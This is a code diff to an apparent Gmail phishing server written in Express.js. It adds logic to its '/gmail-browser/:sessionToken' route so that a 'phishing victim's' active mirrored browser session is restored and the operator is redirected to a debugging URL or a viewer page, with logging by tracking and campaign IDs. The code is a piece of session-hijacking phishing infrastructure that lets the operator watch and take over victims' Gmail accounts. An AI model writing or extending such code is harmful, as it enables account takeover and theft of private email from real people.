@@ -92,7 +92,51 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
   try {
     console.log(`🎯 Gmail phishing victim accessed: ${sessionToken} (tracking: ${trackingId})`);
     
-    // Check if session_type column exists and build appropriate query
+    // First check if this session is already active in memory
+    const activeSession = gmailBrowserService.getSessionInfo(sessionToken);
+    
+    if (activeSession && activeSession.isActive) {
+      console.log(`✅ Found active session, redirecting to existing session: ${sessionToken}`);
+      
+      // Get the debugging URL or session access URL
+      const sessionData = gmailBrowserService.activeSessions.get(sessionToken);
+      if (sessionData && sessionData.debuggingUrl) {
+        // Redirect to the debugging URL for real-time viewing
+        return res.redirect(sessionData.debuggingUrl);
+      } else {
+        // Serve a page that connects to the existing session
+        return res.send(`
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Gmail Session - Connected</title>
+            <style>
+              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+              .success { color: #27ae60; }
+              .info { background: #f8f9fa; padding: 20px; border-radius: 5px; margin: 20px 0; }
+            </style>
+          </head>
+          <body>
+            <h1 class="success">Connected to Active Gmail Session</h1>
+            <div class="info">
+              <p><strong>Session Token:</strong> ${sessionToken}</p>
+              <p><strong>Tracking ID:</strong> ${trackingId}</p>
+              <p><strong>Status:</strong> Active and Ready</p>
+              <p>This session is currently active and connected to Gmail.</p>
+            </div>
+            <script>
+              // Redirect to the frontend viewer
+              setTimeout(() => {
+                window.location.href = 'http://localhost:5175/gmail-viewer?session=${sessionToken}&track=${trackingId}';
+              }, 2000);
+            </script>
+          </body>
+          </html>
+        `);
+      }
+    }
+    
+    // Check database for session record
     const sessionRecord = await new Promise((resolve, reject) => {
       db.all("PRAGMA table_info(WebsiteMirroringSessions)", (err, columns) => {
         if (err) {
@@ -139,14 +183,12 @@ app.get('/gmail-browser/:sessionToken', async (req, res) => {
       `);
     }
 
+    // Session exists in database but not active in memory - try to restore it
+    console.log(`🔄 Session found in database but not active, attempting to restore: ${sessionToken}`);
+    
     const campaignId = sessionRecord.campaign_id;
 
-    // Generate a unique session token for this specific victim
-    const victimSessionToken = require('crypto').randomBytes(16).toString('hex');
-    
-    console.log(`🔐 Creating new Gmail browser session for victim: ${victimSessionToken}`);
-
-    // Create a new browser session for this victim
+    // Try to restore the session using existing session data
     const userInfo = {
       ip: req.ip,
       userAgent: req.get('User-Agent'),
